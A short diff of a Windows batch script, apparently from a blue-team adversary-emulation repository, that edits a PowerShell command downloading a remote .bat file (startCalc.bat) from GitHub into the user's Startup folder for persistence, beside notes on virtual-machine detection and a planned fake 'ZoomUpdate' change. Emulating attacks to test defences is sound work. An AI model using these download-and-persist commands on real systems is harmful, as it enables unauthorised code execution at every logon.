@@ -31,8 +31,7 @@ echo [NOT DETECTED] This system does not exhibit common virtual machine characte
 :: Persistence as user
 ::    Download script to startup
 ::        curl.exe -kL https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat -o "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\startupPersistance.bat"
-powershell.exe -c Invoke-WebRequest -uri "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat" -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\startupPersistance.bat"
-
+powershell.exe -c Invoke-WebRequest -uri "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat"
 ::    Download script to Temp and execute with Registry Key
 
 ::    ZoomUpdate EXE change
